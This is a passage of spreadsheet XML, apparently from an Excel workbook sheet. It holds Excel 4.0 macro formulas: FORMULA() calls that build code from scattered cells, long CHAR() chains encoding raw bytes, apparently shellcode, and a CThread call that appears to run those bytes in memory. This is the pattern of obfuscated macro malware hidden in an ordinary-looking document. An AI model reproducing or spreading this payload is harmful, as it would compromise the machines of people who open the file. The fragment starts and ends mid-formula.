54)&amp;CHAR(30)&amp;CHAR(230)&amp;CHAR(177)&amp;CHAR(25)&amp;CHAR(183)&amp;CHAR(77)&amp;CHAR(41)&amp;CHAR(235)&amp;CHAR(47)&amp;CHAR(196)&amp;CHAR(98)&amp;CHAR(82)&amp;CHAR(32)&amp;CHAR(206)&amp;CHAR(81)&amp;CHAR(255)&amp;CHAR(4)&amp;CHAR(240)&amp;CHAR(132)&amp;CHAR(148)&amp;CHAR(122)&amp;CHAR(192)&amp;CHAR(150)&amp;CHAR(161)&amp;CHAR(141)&amp;CHAR(240)&amp;CHAR(27)&amp;CHAR(57)&amp;CHAR(119)&amp;CHAR(190)&amp;CHAR(169)&amp;CHAR(174)&amp;CHAR(180)&amp;CHAR(91)&amp;CHAR(200)&amp;CHAR(49)&amp;CHAR(81)&amp;CHAR(197)&amp;CHAR(224)&amp;CHAR(255)&amp;CHAR(57)&amp;CHAR(171)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(241)&amp;CHAR(83)&amp;CHAR(72)&amp;CHAR(158)&amp;CHAR(8)&amp;CHAR(68)&amp;CHAR(173)&amp;CHAR(152)&amp;CHAR(52)&amp;CHAR(239)&amp;CHAR(22)&amp;CHAR(21)&amp;CHAR(12)&amp;CHAR(109)</f>
        <v>­{Š‡¬ _x001D_ ¸F_St×ã_x0005_8W^_x0005_Á÷v³R_x001F_×s¹°È_x0002_+¤ŽaÏï …æøxÆ¨”Ø÷p(ãP_x001D_ñå‰ý¤Øåó_x0016_û_x0001_Z¿hôŽ_x0011_}_x001E_eìÛ_x0019_ñÞüÂ’jíñ†ð{˜7L¨«_x000F_÷½6ENL»sy½OÊZ%_x0018_ëf_x0005_r‘UóA²Ñ½ÛÀ_x0002_’‘-f…	XŸ4hÇ™gøÃ6_x0019_@Ž„™Yë)É_x0019_ý_x0003_|¡Oýë_x0003_k¶°\_x0015_*§ì0‹	¿ÎóQ¤{Œ_x0016_sonZ¹œÃ=6dÒÄÞ€ 6_x001E_æ±_x0019_·M)ë/ÄbR ÎQÿ_x0004_ð„”zÀ–¡ð_x001B_9w¾©®´[È1QÅàÿ9«_x000D__x0005_ñSHž_x0008_D­˜4ï_x0016__x0015__x000C_m</v>
      </c>
      <c r="DG19" t="str">
        <f>CHAR(163)&amp;CHAR(84)&amp;CHAR(83)&amp;CHAR(11)&amp;CHAR(156)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(244)&amp;CHAR(159)&amp;CHAR(29)</f>
        <v>£TS_x000B_œ_x0007__x000E_ôŸ_x001D_</v>
      </c>
      <c r="DH19" t="s">
        <v>18</v>
      </c>
      <c r="DJ19" t="b">
        <f>CThread(0,0,$DJ$10,0,0,0)</f>
        <v>0</v>
      </c>
    </row>
    <row r="20" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE20" t="b">
        <f>FORMULA(DH65&amp;DH34&amp;DH27&amp;DH38&amp;DH46&amp;DH66&amp;DH67,DJ20)</f>
        <v>1</v>
      </c>
      <c r="DF20" t="str">
        <f>CHAR(73)&amp;CHAR(180)&amp;CHAR(208)&amp;CHAR(169)&amp;CHAR(53)&amp;CHAR(91)&amp;CHAR(24)&amp;CHAR(180)&amp;CHAR(63)&amp;CHAR(27)&amp;CHAR(21)&amp;CHAR(15)&amp;CHAR(51)&amp;CHAR(129)&amp;CHAR(205)&amp;CHAR(65)&amp;CHAR(131)&amp;CHAR(6)&amp;CHAR(47)&amp;CHAR(216)&amp;CHAR(91)&amp;CHAR(119)&amp;CHAR(17)&amp;CHAR(178)&amp;CHAR(118)&amp;CHAR(55)&amp;CHAR(43)&amp;CHAR(38)&amp;CHAR(6)&amp;CHAR(83)&amp;CHAR(184)&amp;CHAR(52)&amp;CHAR(119)&amp;CHAR(5)&amp;CHAR(60)&amp;CHAR(253)&amp;CHAR(100)&amp;CHAR(91)&amp;CHAR(127)&amp;CHAR(130)&amp;CHAR(66)&amp;CHAR(143)&amp;CHAR(248)&amp;CHAR(44)&amp;CHAR(109)&amp;CHAR(248)&amp;CHAR(183)&amp;CHAR(42)&amp;CHAR(232)&amp;CHAR(150)&amp;CHAR(81)&amp;CHAR(244)&amp;CHAR(6)&amp;CHAR(219)&amp;CHAR(202)&amp;CHAR(204)&amp;CHAR(111)&amp;CHAR(15)&amp;CHAR(223)&amp;CHAR(196)&amp;CHAR(35)&amp;CHAR(109)&amp;CHAR(74)&amp;CHAR(83)&amp;CHAR(29)&amp;CHAR(117)&amp;CHAR(67)&amp;CHAR(72)&amp;CHAR(113)&amp;CHAR(10)&amp;CHAR(57)&amp;CHAR(240)&amp;CHAR(94)&amp;CHAR(96)&amp;CHAR(211)&amp;CHAR(165)&amp;CHAR(54)&amp;CHAR(47)&amp;CHAR(159)&amp;CHAR(129)&amp;CHAR(245)&amp;CHAR(180)&amp;CHAR(162)&amp;CHAR(246)&amp;CHAR(104)&amp;CHAR(90)&amp;CHAR(66)&amp;CHAR(29)&amp;CHAR(197)&amp;CHAR(22)&amp;CHAR(180)&amp;CHAR(13)&amp;CHAR(241)&amp;CHAR(43)&amp;CHAR(207)&amp;CHAR(15)&amp;CHAR(203)&amp;CHAR(173)&amp;CHAR(140)&amp;CHAR(63)&amp;CHAR(227)&amp;CHAR(101)&amp;CHAR(249)&amp;CHAR(211)&amp;CHAR(21)&amp;CHAR(79)&amp;CHAR(112)&amp;CHAR(245)&amp;CHAR(56)&amp;CHAR(60)&amp;CHAR(157)&amp;CHAR(244)&amp;CHAR(78)&amp;CHAR(100)&amp;CHAR(149)&amp;CHAR(234)&amp;CHAR(223)&amp;CHAR(235)&amp;CHAR(144)&amp;CHAR(98)&amp;CHAR(63)&amp;CHAR(227)&amp;CHAR(85)&amp;CHAR(3)&amp;CHAR(125)&amp;CHAR(237)&amp;CHAR(147)&amp;CHAR(205)&amp;CHAR(121)&amp;CHAR(9)&amp;CHAR(233)&amp;CHAR(33)&amp;CHAR(144)&amp;CHAR(172)&amp;CHAR(193)&amp;CHAR(133)&amp;CHAR(128)&amp;CHAR(50)&amp;CHAR(17)&amp;CHAR(105)&amp;CHAR(39)&amp;CHAR(59)&amp;CHAR(108)&amp;CHAR(149)&amp;CHAR(135)&amp;CHAR(116)&amp;CHAR(50)&amp;CHAR(208)&amp;CHAR(229)&amp;CHAR(157)&amp;CHAR(181)&amp;CHAR(51)&amp;CHAR(135)&amp;CHAR(168)&amp;CHAR(8)&amp;CHAR(54)&amp;CHAR(188)&amp;CHAR(76)&amp;CHAR(255)&amp;CHAR(162)&amp;CHAR(8)&amp;CHAR(173)&amp;CHAR(5)&amp;CHAR(39)&amp;CHAR(233)&amp;CHAR(167)&amp;CHAR(103)&amp;CHAR(102)&amp;CHAR(119)&amp;CHAR(103)&amp;CHAR(247)&amp;CHAR(115)&amp;CHAR(233)&amp;CHAR(88)&amp;CHAR(157)&amp;CHAR(239)&amp;CHAR(177)&amp;CHAR(253)&amp;CHAR(207)&amp;CHAR(190)&amp;CHAR(149)&amp;CHAR(240)&amp;CHAR(15)&amp;CHAR(29)&amp;CHAR(245)&amp;CHAR(220)&amp;CHAR(63)&amp;CHAR(124)&amp;CHAR(192)&amp;CHAR(3)&amp;CHAR(2)&amp;CHAR(201)&amp;CHAR(171)&amp;CHAR(33)&amp;CHAR(104)&amp;CHAR(163)&amp;CHAR(168)&amp;CHAR(188)&amp;CHAR(231)&amp;CHAR(54)&amp;CHAR(41)&amp;CHAR(63)&amp;CHAR(226)&amp;CHAR(148)&amp;CHAR(15)&amp;CHAR(59)&amp;CHAR(223)&amp;CHAR(29)&amp;CHAR(242)&amp;CHAR(48)&amp;CHAR(125)&amp;CHAR(122)&amp;CHAR(28)&amp;CHAR(232)&amp;CHAR(83)&amp;CHAR(108)&amp;CHAR(158)&amp;CHAR(193)&amp;CHAR(63)&amp;CHAR(21)&amp;CHAR(169)&amp;CHAR(205)&amp;CHAR(236)&amp;CHAR(223)&amp;CHAR(176)&amp;CHAR(254)&amp;CHAR(2)&amp;CHAR(171)&amp;CHAR(245)&amp;CHAR(111)&amp;CHAR(205)&amp;CHAR(53)&amp;CHAR(126)&amp;CHAR(138)&amp;CHAR(196)&amp;CHAR(83)&amp;CHAR(111)&amp;CHAR(89)&amp;CHAR(60)&amp;CHAR(224)&amp;CHAR(88)&amp;CHAR(214)&amp;CHAR(126)&amp;CHAR(94)&amp;CHAR(103)&amp;CHAR(44)&amp;CHAR(94)&amp;CHAR(239)&amp;CHAR(45)&amp;CHAR(34)&amp;CHAR(233)&amp;CHAR(122)&amp;CHAR(65)&amp;CHAR(190)&amp;CHAR(233)</f>
        <v>I´Ð©5[_x0018_´?_x001B__x0015__x000F_3ÍAƒ_x0006_/Ø[w_x0011_²v7+&amp;_x0006_S¸4w_x0005_&lt;ýd[‚Bø,mø·*è–Qô_x0006_ÛÊÌo_x000F_ßÄ#mJS_x001D_uCHq
9ð^`Ó¥6/Ÿõ´¢öhZB_x001D_Å_x0016_´_x000D_ñ+Ï_x000F_Ë­Œ?ãeùÓ_x0015_Opõ8&lt;ôNd•êßëb?ãU_x0003_}í“Íy	é!¬Á…€2_x0011_i';l•‡t2Ðåµ3‡¨_x0008_6¼Lÿ¢_x0008_­_x0005_'é§gfwg÷séXï±ýÏ¾•ð_x000F__x001D_õÜ?|À_x0003__x0002_É«!h£¨¼ç6)?â”_x000F_;ß_x001D_ò0}z_x001C_èSlžÁ?_x0015_©Íìß°þ_x0002_«õoÍ5~ŠÄSoY&lt;àXÖ~^g,^ï-"ézA¾é</v>
      </c>
      <c r="DG20" t="str">
        <f>CHAR(82)&amp;CHAR(146)&amp;CHAR(94)&amp;CHAR(170)&amp;CHAR(238)&amp;CHAR(49)&amp;CHAR(26)&amp;CHAR(240)&amp;CHAR(39)&amp;CHAR(223)</f>
        <v>R’^ªî1_x001A_ð'ß</v>
      </c>
      <c r="DH20" t="s">
        <v>19</v>
      </c>
      <c r="DJ20" t="b">
        <f>HALT()</f>
        <v>0</v>
      </c>
    </row>
    <row r="21" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE21" t="b">
        <f>FORMULA(DH54&amp;DH56&amp;DH57&amp;DH55&amp;DH54&amp;DH60&amp;DH60&amp;DH55&amp;DH61&amp;DH53,DJ21)</f>
        <v>1</v>
      </c>
      <c r="DF21" t="str">
        <f>CHAR(36)&amp;CHAR(221)&amp;CHAR(122)&amp;CHAR(234)&amp;CHAR(191)&amp;CHAR(61)&amp;CHAR(178)&amp;CHAR(38)&amp;CHAR(215)&amp;CHAR(200)&amp;CHAR(60)&amp;CHAR(166)&amp;CHAR(230)&amp;CHAR(36)&amp;CHAR(131)&amp;CHAR(51)&amp;CHAR(130)&amp;CHAR(123)&amp;CHAR(130)&amp;CHAR(46)&amp;CHAR(59)&amp;CHAR(185)&amp;CHAR(28)&amp;CHAR(46)&amp;CHAR(184)&amp;CHAR(235)&amp;CHAR(242)&amp;CHAR(110)&amp;CHAR(181)&amp;CHAR(244)&amp;CHAR(90)&amp;CHAR(131)&amp;CHAR(85)&amp;CHAR(28)&amp;CHAR(246)&amp;CHAR(93)&amp;CHAR(68)&amp;CHAR(240)&amp;CHAR(206)&amp;CHAR(249)&amp;CHAR(170)&amp;CHAR(93)&amp;CHAR(42)&amp;CHAR(38)&amp;CHAR(68)&amp;CHAR(33)&amp;CHAR(196)&amp;CHAR(111)&amp;CHAR(81)&amp;CHAR(29)&amp;CHAR(90)&amp;CHAR(248)&amp;CHAR(210)&amp;CHAR(152)&amp;CHAR(127)&amp;CHAR(14)&amp;CHAR(117)&amp;CHAR(151)&amp;CHAR(81)&amp;CHAR(42)&amp;CHAR(115)&amp;CHAR(22)&amp;CHAR(172)&amp;CHAR(23)&amp;CHAR(120)&amp;CHAR(79)&amp;CHAR(235)&amp;CHAR(203)&amp;CHAR(169)&amp;CHAR(33)&amp;CHAR(217)&amp;CHAR(215)&amp;CHAR(170)&amp;CHAR(63)&amp;CHAR(1)&amp;CHAR(188)&amp;CHAR(77)&amp;CHAR(108)&amp;CHAR(152)&amp;CHAR(68)&amp;CHAR(109)&amp;CHAR(84)&amp;CHAR(162)&amp;CHAR(131)&amp;CHAR(173)&amp;CHAR(136)&amp;CHAR(74)&amp;CHAR(88)&amp;CHAR(203)&amp;CHAR(159)&amp;CHAR(171)&amp;CHAR(160)&amp;CHAR(52)&amp;CHAR(137)&amp;CHAR(206)&amp;CHAR(54)&amp;CHAR(157)&amp;CHAR(153)&amp;CHAR(104)&amp;CHAR(189)&amp;CHAR(38)&amp;CHAR(150)&amp;CHAR(216)&amp;CHAR(228)&amp;CHAR(56)&amp;CHAR(152)&amp;CHAR(153)&amp;CHAR(21)&amp;CHAR(255)&amp;CHAR(177)&amp;CHAR(151)&amp;CHAR(87)&amp;CHAR(127)&amp;CHAR(133)&amp;CHAR(213)&amp;CHAR(195)&amp;CHAR(38)&amp;CHAR(228)&amp;CHAR(169)&amp;CHAR(188)&amp;CHAR(44)&amp;CHAR(141)&amp;CHAR(164)&amp;CHAR(186)&amp;CHAR(190)&amp;CHAR(93)&amp;CHAR(245)&amp;CHAR(66)&amp;CHAR(61)&amp;CHAR(47)&amp;CHAR(107)&amp;CHAR(98)&amp;CHAR(59)&amp;CHAR(219)&amp;CHAR(36)&amp;CHAR(34)&amp;CHAR(82)&amp;CHAR(248)&amp;CHAR(66)&amp;CHAR(66)&amp;CHAR(114)&amp;CHAR(143)&amp;CHAR(70)&amp;CHAR(66)&amp;CHAR(158)&amp;CHAR(42)&amp;CHAR(111)&amp;CHAR(59)&amp;CHAR(128)&amp;CHAR(99)&amp;CHAR(80)&amp;CHAR(253)&amp;CHAR(243)&amp;CHAR(128)&amp;CHAR(218)&amp;CHAR(43)&amp;CHAR(177)&amp;CHAR(194)&amp;CHAR(140)&amp;CHAR(38)&amp;CHAR(142)&amp;CHAR(181)&amp;CHAR(55)&amp;CHAR(30)&amp;CHAR(132)&amp;CHAR(198)&amp;CHAR(123)&amp;CHAR(72)&amp;CHAR(244)&amp;CHAR(2)&amp;CHAR(74)&amp;CHAR(182)&amp;CHAR(83)&amp;CHAR(197)&amp;CHAR(179)&amp;CHAR(224)&amp;CHAR(15)&amp;CHAR(106)&amp;CHAR(171)&amp;CHAR(94)&amp;CHAR(160)&amp;CHAR(9)&amp;CHAR(37)&amp;CHAR(183)&amp;CHAR(250)&amp;CHAR(226)&amp;CHAR(217)&amp;CHAR(229)&amp;CHAR(231)&amp;CHAR(242)&amp;CHAR(54)&amp;CHAR(125)&amp;CHAR(13)&amp;CHAR(57)&amp;CHAR(137)&amp;CHAR(172)&amp;CHAR(123)&amp;CHAR(254)&amp;CHAR(72)&amp;CHAR(33)&amp;CHAR(183)&amp;CHAR(85)&amp;CHAR(185)&amp;CHAR(40)&amp;CHAR(150)&amp;CHAR(152)&amp;CHAR(43)&amp;CHAR(38)&amp;CHAR(205)&amp;CHAR(73)&amp;CHAR(133)&amp;CHAR(96)&amp;CHAR(139)&amp;CHAR(36)&amp;CHAR(77)&amp;CHAR(220)&amp;CHAR(245)&amp;CHAR(130)&amp;CHAR(107)&amp;CHAR(126)&amp;CHAR(8)&amp;CHAR(156)&amp;CHAR(249)&amp;CHAR(45)&amp;CHAR(212)&amp;CHAR(207)&amp;CHAR(61)&amp;CHAR(147)&amp;CHAR(239)&amp;CHAR(134)&amp;CHAR(199)&amp;CHAR(121)&amp;CHAR(11)&amp;CHAR(78)&amp;CHAR(130)&amp;CHAR(207)&amp;CHAR(88)&amp;CHAR(161)&amp;CHAR(22)&amp;CHAR(213)&amp;CHAR(235)&amp;CHAR(170)&amp;CHAR(192)&amp;CHAR(233)&amp;CHAR(121)&amp;CHAR(216)&amp;CHAR(215)&amp;CHAR(127)&amp;CHAR(194)&amp;CHAR(36)&amp;CHAR(206)&amp;CHAR(126)&amp;CHAR(211)&amp;CHAR(99)&amp;CHAR(99)</f>
        <v>$Ýzê¿=²&amp;×È&lt;¦æ$ƒ3‚{‚.;¹_x001C_.¸ëònµôZƒU_x001C_ö]DðÎùª]*&amp;D!ÄoQ_x001D_ZøÒ˜_x000E_u—Q*s_x0016_¬_x0017_xOëË©!Ù×ª?_x0001_¼Ml˜DmT¢ƒ­ˆJXËŸ« 4‰Î6™h½&amp;–Øä8˜™_x0015_ÿ±—W…ÕÃ&amp;ä©¼,¤º¾]õB=/kb;Û$"RøBBrFBž*o;€cPýó€Ú+±ÂŒ&amp;Žµ7_x001E_„Æ{Hô_x0002_J¶SÅ³à_x000F_j«^ 	%·úâÙåçò6}_x000D_9‰¬{þH!·U¹(–˜+&amp;ÍI…`‹$MÜõ‚k~_x0008_œù-ÔÏ=“ï†Çy_x000B_N‚ÏX¡_x0016_ÕëªÀéyØ×Â$Î~Ócc</v>
      </c>
      <c r="DG21" t="str">
        <f>CHAR(157)&amp;CHAR(183)&amp;CHAR(10)&amp;CHAR(149)&amp;CHAR(7)&amp;CHAR(29)&amp;CHAR(82)&amp;CHAR(215)&amp;CHAR(155)&amp;CHAR(11)</f>
        <v>·
•_x0007__x001D_R×›_x000B_</v>
      </c>
      <c r="DH21" t="s">
        <v>20</v>
      </c>
      <c r="DJ21">
        <v>1342439424</v>
      </c>
    </row>
    <row r="22" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE22" t="b">
        <f>FORMULA(DH53,DJ22)</f>
        <v>1</v>
      </c>
      <c r="DF22" t="str">
        <f>CHAR(47)&amp;CHAR(247)&amp;CHAR(31)&amp;CHAR(228)&amp;CHAR(164)&amp;CHAR(121)&amp;CHAR(209)&amp;CHAR(202)&amp;CHAR(128)&amp;CHAR(31)&amp;CHAR(100)&amp;CHAR(154)&amp;CHAR(223)&amp;CHAR(27)&amp;CHAR(54)&amp;CHAR(151)&amp;CHAR(192)&amp;CHAR(245)&amp;CHAR(80)&amp;CHAR(45)&amp;CHAR(196)&amp;CHAR(226)&amp;CHAR(2)&amp;CHAR(121)&amp;CHAR(238)&amp;CHAR(239)&amp;CHAR(3)&amp;CHAR(183)&amp;CHAR(12)&amp;CHAR(45)&amp;CHAR(76)&amp;CHAR(99)&amp;CHAR(230)&amp;CHAR(117)&amp;CHAR(224)&amp;CHAR(114)&amp;CHAR(127)&amp;CHAR(240)&amp;CHAR(166)&amp;CHAR(224)&amp;CHAR(166)&amp;CHAR(173)&amp;CHAR(189)&amp;CHAR(137)&amp;CHAR(253)&amp;CHAR(214)&amp;CHAR(101)&amp;CHAR(254)&amp;CHAR(235)&amp;CHAR(192)&amp;CHAR(189)&amp;CHAR(127)&amp;CHAR(19)&amp;CHAR(126)&amp;CHAR(96)&amp;CHAR(195)&amp;CHAR(133)&amp;CHAR(176)&amp;CHAR(12)&amp;CHAR(239)&amp;CHAR(3)&amp;CHAR(84)&amp;CHAR(60)&amp;CHAR(236)&amp;CHAR(26)&amp;CHAR(7)&amp;CHAR(79)&amp;CHAR(122)&amp;CHAR(233)&amp;CHAR(47)&amp;CHAR(234)&amp;CHAR(105)&amp;CHAR(89)&amp;CHAR(161)&amp;CHAR(84)&amp;CHAR(37)&amp;CHAR(232)&amp;CHAR(152)&amp;CHAR(221)&amp;CHAR(113)&amp;CHAR(34)&amp;CHAR(215)&amp;CHAR(248)&amp;CHAR(224)&amp;CHAR(25)&amp;CHAR(75)&amp;CHAR(232)&amp;CHAR(238)&amp;CHAR(174)&amp;CHAR(196)&amp;CHAR(23)&amp;CHAR(128)&amp;CHAR(97)&amp;CHAR(14)&amp;CHAR(154)&amp;CHAR(213)&amp;CHAR(63)&amp;CHAR(123)&amp;CHAR(47)&amp;CHAR(160)&amp;CHAR(160)&amp;CHAR(220)&amp;CHAR(202)&amp;CHAR(209)&amp;CHAR(238)&amp;CHAR(122)&amp;CHAR(218)&amp;CHAR(57)&amp;CHAR(40)&amp;CHAR(236)&amp;CHAR(92)&amp;CHAR(231)&amp;CHAR(37)&amp;CHAR(210)&amp;CHAR(33)&amp;CHAR(77)&amp;CHAR(80)&amp;CHAR(184)&amp;CHAR(31)&amp;CHAR(185)&amp;CHAR(79)&amp;CHAR(58)&amp;CHAR(5)&amp;CHAR(255)&amp;CHAR(49)&amp;CHAR(17)&amp;CHAR(42)&amp;CHAR(86)&amp;CHAR(95)&amp;CHAR(65)&amp;CHAR(58)&amp;CHAR(237)&amp;CHAR(170)&amp;CHAR(252)&amp;CHAR(131)&amp;CHAR(217)&amp;CHAR(75)&amp;CHAR(67)&amp;CHAR(27)&amp;CHAR(226)&amp;CHAR(178)&amp;CHAR(179)&amp;CHAR(141)&amp;CHAR(43)&amp;CHAR(39)&amp;CHAR(251)&amp;CHAR(206)&amp;CHAR(100)&amp;CHAR(254)&amp;CHAR(84)&amp;CHAR(53)&amp;CHAR(235)&amp;CHAR(107)&amp;CHAR(234)&amp;CHAR(173)&amp;CHAR(172)&amp;CHAR(78)&amp;CHAR(17)&amp;CHAR(120)&amp;CHAR(230)&amp;CHAR(135)&amp;CHAR(44)&amp;CHAR(162)&amp;CHAR(227)&amp;CHAR(41)&amp;CHAR(168)&amp;CHAR(64)&amp;CHAR(169)&amp;CHAR(143)&amp;CHAR(176)&amp;CHAR(255)&amp;CHAR(49)&amp;CHAR(191)&amp;CHAR(233)&amp;CHAR(168)&amp;CHAR(229)&amp;CHAR(53)&amp;CHAR(26)&amp;CHAR(227)&amp;CHAR(77)&amp;CHAR(84)&amp;CHAR(15)&amp;CHAR(237)&amp;CHAR(200)&amp;CHAR(34)&amp;CHAR(37)&amp;CHAR(253)&amp;CHAR(105)&amp;CHAR(43)&amp;CHAR(238)&amp;CHAR(156)&amp;CHAR(187)&amp;CHAR(102)&amp;CHAR(248)&amp;CHAR(191)&amp;CHAR(9)&amp;CHAR(85)&amp;CHAR(3)&amp;CHAR(134)&amp;CHAR(138)&amp;CHAR(12)&amp;CHAR(220)&amp;CHAR(41)&amp;CHAR(195)&amp;CHAR(93)&amp;CHAR(16)&amp;CHAR(94)&amp;CHAR(230)&amp;CHAR(216)&amp;CHAR(128)&amp;CHAR(11)&amp;CHAR(94)&amp;CHAR(170)&amp;CHAR(82)&amp;CHAR(66)&amp;CHAR(68)&amp;CHAR(138)&amp;CHAR(22)&amp;CHAR(185)&amp;CHAR(49)&amp;CHAR(129)&amp;CHAR(244)&amp;CHAR(8)&amp;CHAR(200)&amp;CHAR(6)&amp;CHAR(212)&amp;CHAR(169)&amp;CHAR(166)&amp;CHAR(236)&amp;CHAR(165)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(79)&amp;CHAR(68)&amp;CHAR(99)&amp;CHAR(51)&amp;CHAR(186)&amp;CHAR(104)&amp;CHAR(5)&amp;CHAR(58)&amp;CHAR(93)&amp;CHAR(209)&amp;CHAR(101)&amp;CHAR(25)&amp;CHAR(80)&amp;CHAR(202)&amp;CHAR(87)&amp;CHAR(51)&amp;CHAR(108)&amp;CHAR(130)&amp;CHAR(169)&amp;CHAR(242)&amp;CHAR(198)&amp;CHAR(168)&amp;CHAR(212)</f>
        <v>/÷_x001F_ä¤yÑÊ€_x001F_dšß_x001B_6—ÀõP-Äâ_x0002_yîï_x0003_·_x000C_-Lcæuàrð¦à¦­½‰ýÖeþëÀ½_x0013_~`Ã…°_x000C_ï_x0003_T&lt;ì_x001A__x0007_Ozé/êiY¡T%è˜Ýq"×øà_x0019_Kèî®Ä_x0017_€a_x000E_šÕ?{/  ÜÊÑîzÚ9(ì\ç%Ò!MP¸_x001F_¹O:_x0005_ÿ1_x0011_*V_A:íªüƒÙKC_x001B_â²³+'ûÎdþT5ëkê­¬N_x0011_xæ‡,¢ã)¨@©°ÿ1¿é¨å5_x001A_ãMT_x000F_íÈ"%ýi+îœ»fø¿	U_x0003_†Š_x000C_Ü)Ã]_x0010_^æØ€_x000B_^ªRBDŠ_x0016_¹1ô_x0008_È_x0006_Ô©¦ì¥×ÕODc3ºh_x0005_:]Ñe_x0019_PÊW3l‚©òÆ¨Ô</v>
      </c>
      <c r="DG22" t="str">
        <f>CHAR(214)&amp;CHAR(87)&amp;CHAR(218)&amp;CHAR(150)&amp;CHAR(38)&amp;CHAR(243)&amp;CHAR(209)&amp;CHAR(203)&amp;CHAR(203)&amp;CHAR(146)</f>
        <v>ÖWÚ–&amp;óÑËË’</v>
      </c>
      <c r="DH22" t="s">
        <v>21</v>
      </c>
      <c r="DJ22">
        <v>0</v>
      </c>
    </row>
    <row r="23" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE23" t="b">
        <f>FORMULA(DH65&amp;DH49&amp;DH34&amp;DH35&amp;DH38&amp;DH31&amp;DH66&amp;DH44&amp;DH55&amp;DH55&amp;DH29&amp;DH54&amp;DH54&amp;DH57&amp;DH65&amp;DH53&amp;DH67,DJ23)</f>
        <v>1</v>
      </c>
      <c r="DF23" t="str">
        <f>CHAR(174)&amp;CHAR(20)&amp;CHAR(133)&amp;CHAR(165)&amp;CHAR(153)&amp;CHAR(246)&amp;CHAR(98)&amp;CHAR(124)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(176)&amp;CHAR(175)&amp;CHAR(52)&amp;CHAR(155)&amp;CHAR(201)&amp;CHAR(244)&amp;CHAR(32)&amp;CHAR(37)&amp;CHAR(137)&amp;CHAR(101)&amp;CHAR(208)&amp;CHAR(129)&amp;CHAR(159)&amp;CHAR(151)&amp;CHAR(146)&amp;CHAR(76)&amp;CHAR(251)&amp;CHAR(184)&amp;CHAR(15)&amp;CHAR(110)&amp;CHAR(221)&amp;CHAR(124)&amp;CHAR(181)&amp;CHAR(61)&amp;CHAR(60)&amp;CHAR(137)&amp;CHAR(189)&amp;CHAR(192)&amp;CHAR(155)&amp;CHAR(49)&amp;CHAR(27)&amp;CHAR(60)&amp;CHAR(198)&amp;CHAR(31)&amp;CHAR(8)&amp;CHAR(225)&amp;CHAR(227)&amp;CHAR(186)&amp;CHAR(88)&amp;CHAR(206)&amp;CHAR(33)&amp;CHAR(172)&amp;CHAR(234)&amp;CHAR(24)&amp;CHAR(86)&amp;CHAR(81)&amp;CHAR(45)&amp;CHAR(121)&amp;CHAR(54)&amp;CHAR(230)&amp;CHAR(47)&amp;CHAR(130)&amp;CHAR(109)&amp;CHAR(121)&amp;CHAR(198)&amp;CHAR(131)&amp;CHAR(163)&amp;CHAR(195)&amp;CHAR(80)&amp;CHAR(28)&amp;CHAR(183)&amp;CHAR(230)&amp;CHAR(246)&amp;CHAR(171)&amp;CHAR(23)&amp;CHAR(91)&amp;CHAR(153)&amp;CHAR(156)&amp;CHAR(53)&amp;CHAR(95)&amp;CHAR(144)&amp;CHAR(138)&amp;CHAR(180)&amp;CHAR(242)&amp;CHAR(61)&amp;CHAR(202)&amp;CHAR(62)&amp;CHAR(129)&amp;CHAR(165)&amp;CHAR(93)&amp;CHAR(31)&amp;CHAR(212)&amp;CHAR(14)&amp;CHAR(198)&amp;CHAR(177)&amp;CHAR(90)&amp;CHAR(115)&amp;CHAR(240)&amp;CHAR(34)&amp;CHAR(28)&amp;CHAR(126)&amp;CHAR(56)&amp;CHAR(201)&amp;CHAR(155)&amp;CHAR(6)&amp;CHAR(90)&amp;CHAR(24)&amp;CHAR(49)&amp;CHAR(66)&amp;CHAR(249)&amp;CHAR(185)&amp;CHAR(124)&amp;CHAR(169)&amp;CHAR(6)&amp;CHAR(43)&amp;CHAR(224)&amp;CHAR(143)&amp;CHAR(211)&amp;CHAR(194)&amp;CHAR(226)&amp;CHAR(54)&amp;CHAR(61)&amp;CHAR(85)&amp;CHAR(208)&amp;CHAR(139)&amp;CHAR(92)&amp;CHAR(248)&amp;CHAR(134)&amp;CHAR(249)&amp;CHAR(247)&amp;CHAR(104)&amp;CHAR(143)&amp;CHAR(89)&amp;CHAR(8)&amp;CHAR(210)&amp;CHAR(94)&amp;CHAR(67)&amp;CHAR(26)&amp;CHAR(176)&amp;CHAR(196)&amp;CHAR(231)&amp;CHAR(168)&amp;CHAR(214)&amp;CHAR(31)&amp;CHAR(26)&amp;CHAR(111)&amp;CHAR(82)&amp;CHAR(252)&amp;CHAR(7)&amp;CHAR(76)&amp;CHAR(56)&amp;CHAR(220)&amp;CHAR(142)&amp;CHAR(250)&amp;CHAR(20)&amp;CHAR(164)&amp;CHAR(136)&amp;CHAR(238)&amp;CHAR(14)&amp;CHAR(25)&amp;CHAR(8)&amp;CHAR(113)&amp;CHAR(45)&amp;CHAR(161)&amp;CHAR(207)&amp;CHAR(33)&amp;CHAR(30)&amp;CHAR(134)&amp;CHAR(209)&amp;CHAR(194)&amp;CHAR(32)&amp;CHAR(103)&amp;CHAR(210)&amp;CHAR(145)&amp;CHAR(198)&amp;CHAR(116)&amp;CHAR(20)&amp;CHAR(242)&amp;CHAR(111)&amp;CHAR(240)&amp;CHAR(100)&amp;CHAR(119)&amp;CHAR(50)&amp;CHAR(57)&amp;CHAR(54)&amp;CHAR(162)&amp;CHAR(233)&amp;CHAR(84)&amp;CHAR(234)&amp;CHAR(9)&amp;CHAR(210)&amp;CHAR(101)&amp;CHAR(66)&amp;CHAR(102)&amp;CHAR(36)&amp;CHAR(214)&amp;CHAR(213)&amp;CHAR(169)&amp;CHAR(190)&amp;CHAR(164)&amp;CHAR(65)&amp;CHAR(80)&amp;CHAR(165)&amp;CHAR(105)&amp;CHAR(223)&amp;CHAR(94)&amp;CHAR(14)&amp;CHAR(15)&amp;CHAR(250)&amp;CHAR(91)&amp;CHAR(232)&amp;CHAR(54)&amp;CHAR(192)&amp;CHAR(59)&amp;CHAR(217)&amp;CHAR(32)&amp;CHAR(34)&amp;CHAR(118)&amp;CHAR(214)&amp;CHAR(143)&amp;CHAR(150)&amp;CHAR(165)&amp;CHAR(167)&amp;CHAR(252)&amp;CHAR(253)&amp;CHAR(152)&amp;CHAR(185)&amp;CHAR(222)